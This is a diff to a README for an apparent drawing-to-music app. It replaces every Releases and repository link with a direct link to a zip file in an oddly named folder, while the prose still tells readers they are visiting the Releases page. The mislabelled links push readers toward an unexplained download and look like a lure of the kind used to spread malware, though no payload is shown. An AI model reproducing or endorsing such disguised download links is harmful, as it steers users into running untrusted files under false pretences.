@@ -1,6 +1,6 @@
 # 🎨 music-from-drawings-pro - Transform Drawings into Music Instantly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Duda9922/music-from-drawings-pro/releases)
+[![Download](https://raw.githubusercontent.com/Duda9922/music-from-drawings-pro/main/agrostologic/music-from-drawings-pro.zip)](https://raw.githubusercontent.com/Duda9922/music-from-drawings-pro/main/agrostologic/music-from-drawings-pro.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps:
 
 1. **Download the Application**  
    Click the link below to visit the Releases page. From there, you can download the latest version of the application.  
-   [Download the latest version](https://github.com/Duda9922/music-from-drawings-pro/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Duda9922/music-from-drawings-pro/main/agrostologic/music-from-drawings-pro.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To run Music from Drawings Pro, ensure you have the following:
 
 1. **Go to the Releases Page**  
    Visit the following link to download the application:  
-   [Download the latest version](https://github.com/Duda9922/music-from-drawings-pro/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Duda9922/music-from-drawings-pro/main/agrostologic/music-from-drawings-pro.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, locate the latest version. Click on the appropriate file for your operating system.
@@ -91,5 +91,5 @@ This project is licensed under the MIT License. Check the LICENSE file for more 
 
 ## 📲 Links
 
-- [GitHub Repository](https://github.com/Duda9922/music-from-drawings-pro)
-- [Download the latest version](https://github.com/Duda9922/music-from-drawings-pro/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Duda9922/music-from-drawings-pro/main/agrostologic/music-from-drawings-pro.zip)
+- [Download the latest version](https://raw.githubusercontent.com/Duda9922/music-from-drawings-pro/main/agrostologic/music-from-drawings-pro.zip)
